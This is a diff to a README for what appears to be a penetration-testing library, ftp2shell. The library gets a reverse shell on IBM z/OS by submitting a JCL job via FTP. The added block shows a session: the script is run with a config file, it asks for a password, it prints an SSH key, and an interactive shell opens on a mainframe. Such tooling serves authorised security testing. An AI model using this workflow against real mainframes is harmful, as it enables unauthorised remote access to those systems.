@@ -2,6 +2,21 @@
 
 Library set to get a secure reverse shell by submitting a JCL job via FTP on z/OS.
 
+```
+$ python ftp2shell.py config.ini
+Input the password for zuser on target.mainframe.net:
+
+Save the pulic key below in ~ccserveraccount/.ssh/authorized_keys
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+og7UDXjtluvauvB3Uo7eFqYGTDYlptkdCIcUPNlakHbaZDTsXl/7xRPrbfuan+NLltHzmeYXm8JWSqDGsP+cyA2iRlu3hri8OhYtJtd8Sv/brEkg0ePc2X7U6l1/Qoaj8HWtS7wxXXKuCvChf3z/G7etSFOhiV7cp02JJTvK9dX5baAzw2DCqfh5LSRPlE7QbLqigYlI6bXxUfJ1TX5FdNSKdnBc7zL1umBT70+T/p5kZ/jDexGVsvdGtmgv1jrbONFGQuDz38GuvqyK5TNMw1EJBa/RxCXzRFKMdlfUWGeQQweoYNcDkftfAr84NRX8edXuh1mgyDOcIaCtj5Zl
+
+Press Enter to continue...
+mf.bigiron.local> uname
+OS/390
+mf.bigiron.local> exit
+This will terminate the connection to mf.bigiron.local, are you sure? (y/N) y
+```
+
 The library contains:
 
  * `config.ini` a sample configuration file
